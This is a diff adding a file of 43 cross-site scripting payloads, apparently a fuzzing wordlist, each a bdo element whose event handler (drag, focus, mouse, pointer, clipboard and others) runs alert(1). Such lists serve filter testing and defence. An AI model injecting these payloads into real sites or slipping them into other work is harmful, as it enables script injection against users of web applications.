@@ -1,0 +1,43 @@
+<bdo draggable="true" ondrag="alert(1)">test</bdo>
+<bdo draggable="true" ondragend="alert(1)">test</bdo>
+<bdo draggable="true" ondragenter="alert(1)">test</bdo>
+<bdo draggable="true" ondragleave="alert(1)">test</bdo>
+<bdo draggable="true" ondragstart="alert(1)">test</bdo>
+<bdo id=x tabindex=1 onactivate=alert(1)></bdo>
+<bdo id=x tabindex=1 onbeforeactivate=alert(1)></bdo>
+<bdo id=x tabindex=1 onbeforedeactivate=alert(1)></bdo><input autofocus>
+<bdo id=x tabindex=1 ondeactivate=alert(1)></bdo><input id=y autofocus>
+<bdo id=x tabindex=1 onfocus=alert(1)></bdo>
+<bdo id=x tabindex=1 onfocusin=alert(1)></bdo>
+<bdo onafterscriptexecute=alert(1)><script>1</script>
+<bdo onbeforecopy="alert(1)" contenteditable>test</bdo>
+<bdo onbeforecut="alert(1)" contenteditable>test</bdo>
+<bdo onbeforepaste="alert(1)" contenteditable>test</bdo>
+<bdo onbeforescriptexecute=alert(1)><script>1</script>
+<bdo onblur=alert(1) tabindex=1 id=x></bdo><input autofocus>
+<bdo onclick="alert(1)">test</bdo>
+<bdo oncontextmenu="alert(1)">test</bdo>
+<bdo oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<bdo oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<bdo ondblclick="alert(1)" autofocus tabindex=1>test</bdo>
+<bdo onfocusout=alert(1) tabindex=1 id=x></bdo><input autofocus>
+<bdo onkeydown="alert(1)" contenteditable>test</bdo>
+<bdo onkeypress="alert(1)" contenteditable>test</bdo>
+<bdo onkeyup="alert(1)" contenteditable>test</bdo>
+<bdo onmousedown="alert(1)">test</bdo>
+<bdo onmouseenter="alert(1)">test</bdo>
+<bdo onmouseleave="alert(1)">test</bdo>
+<bdo onmousemove="alert(1)">test</bdo>
+<bdo onmouseout="alert(1)">test</bdo>
+<bdo onmouseover="alert(1)">test</bdo>
+<bdo onmouseup="alert(1)">test</bdo>
+<bdo onmousewheel=alert(1)>requires scrolling
+<bdo onpaste="alert(1)" contenteditable>test</bdo>
+<bdo onpointerdown=alert(1)>XSS</bdo>
+<bdo onpointerenter=alert(1)>XSS</bdo>
+<bdo onpointerleave=alert(1)>XSS</bdo>
+<bdo onpointermove=alert(1)>XSS</bdo>
+<bdo onpointerout=alert(1)>XSS</bdo>
+<bdo onpointerover=alert(1)>XSS</bdo>
+<bdo onpointerrawupdate=alert(1)>XSS</bdo>
+<bdo onpointerup=alert(1)>XSS</bdo>
